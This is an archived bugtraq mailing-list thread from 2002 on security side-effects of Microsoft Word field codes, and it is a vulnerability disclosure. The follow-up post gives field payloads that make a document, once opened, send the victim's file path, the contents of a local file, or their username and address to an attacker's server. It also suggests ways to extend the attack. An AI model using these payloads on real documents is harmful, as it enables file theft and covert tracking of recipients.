Proof of concept:
Inserting the following field structure at the tail of the document will cause \
"Hello" to be displayed if the filename is "a.doc" and "Bye" otherwise. { IF { \
FILENAME  \* MERGEFORMAT { DATE } } = "a.doc" "Hello" "Bye" \* MERGEFORMAT }

Countermeasures:
Do not sign dynamic documents (i.e. know what you are signing).

[[prev in list](?l=bugtraq&m=103046781907774&w=2)] [[next in list](?l=bugtraq&m=103046450203569&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=103054818425127&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_332d9d94_20250125_154208.html ===

```
[[prev in list](?l=bugtraq&m=103247843910484&w=2)] [[next in list](?l=bugtraq&m=103255778021468&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    More vulnerabilities (Re: Security side-effects of Word fields)
From:       [Alex Gantman <agantman () qualcomm ! com>](?a=103040016600002&r=1&w=2)
Date:       [2002-09-19 21:57:01](?l=bugtraq&r=1&w=2&b=200209)
[Download RAW [message](?l=bugtraq&m=103252858816401&q=mbox) or [body](?l=bugtraq&m=103252858816401&q=raw)]

In-Reply-To: <20020826212322.1137.qmail@mail.securityfocus.com>

A lot of people have been complaining about the fact that Alice must coerce Bob into \
editing and returning the bugged document.  In this feature-driven market the cries \
of the users have not fallen on deaf ears.  There appears to be a way for Alice to \
steal files from Bob (and a few other things) and all Bob has to do is open the Word \
document that Alice has sent to him.  He no longer needs to bother with editing, or \
printing, or sending the document back to Alice.

Richard Edwards brought up the fact that the {INCLUDEPICTURE} field, unlike the \
{INCLUDETEXT} field, accepts URLs and not just local file names.  So, if Alice can \
get the {INCLUDEPICTURE} field to update automatically every time the document is \
opened (by using the \d switch, for example) it will trigger a message to be sent to \
a server of her choice.  So, what can Alice do with it?  She could, for example, get \
the absolute path of where Bob has saved the document as well as the contents of some \
other file on Bob's computer:

{ INCLUDEPICTURE { QUOTE "http:\\www.alicesserver.com\" & { FILENAME \p } & { \
INCLUDETEXT "c:\\a.txt" } } \d }

She could also keep track of who is reading (or printing) the file she sent to Bob:

{ INCLUDEPICTURE { QUOTE "http:\\www.alicesserver.com\" & { USERNAME } & { \
USERADDRESS } } \d }

There are some limitations to what Alice can do with this.  Word limits the HTTP URLs \
to 256 characters ( I don't know what the limit for other URLs is).   Also, the \
{USERNAME} and {USERADDRESS} fields do not update automatically when a document is \
opened on all versions of Word (but they do when the document is printed).

The proof-of-concept code above is just pseudocode.  It does not include all the \
triggers necessary for the fields to update automatically.  I am sure that the reader \
can easily combine this with my previous post to get things right.  Testing out this \
vulnerability is a little more difficult for individual users because it requires \
access to a web server.  So, if anyone out there wants to contribute a web site that \
simply displays its own logs, I will contribute a Word file with a fully functioning \
demonstration of the exploit that people can use to test this vulnerability.

I really don't have any time to spend on this at work, and I have already taken \
enough time from my wife and kid for this.  So, I am dropping this as it stands now.  \
For those interested in pursuing these issues further I have put together some \
exercises for the reader: 1) Other exploits of fields
   a) {INCLUDEPICTURE} accepts many different types of URLs.  I've only tested HTTP \
(and mailto to some extent).  What happens when you use FTP, telnet, file, etc?  b) \
It appears that the {INCLUDEPICTURE} field creates only a one-way channel from the \
victim to the attacker.  Is it possible that some of the URLs will allow a 2-way \
channel?  If the field can ever evaluate to a text response (as opposed to the \
picture), the response can be used as input to another field.  c) Are there other \
ways of triggering the automatic updating of fields?  d) How far can you go with \
fields?  Alice can set ({SET}) and get ({REF}) variables, branch ({IF}), perform \
basic math ({=}), get user information ({USERNAME}, {USERADDRESS}), read files \
({INCLUDETEXT}, {INCLUDEPICTURE}), send messages over the network ({INCLUDEPICTURE}), \
and send commands to the printer ({PRINT}). 2) Are there other applications with \
similar vulnerabilities. 3) Has anyone seen an example of these exploits out in the \
wild (from before the original post to bugtraq)?

Microsoft was notified on 9/17/2002.

> From: Alex Gantman <agantman@qualcomm.com>
> To: bugtraq@securityfocus.com
> Subject: Security side-effects of Word fields
>
>

[[prev in list](?l=bugtraq&m=103247843910484&w=2)] [[next in list](?l=bugtraq&m=103255778021468&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


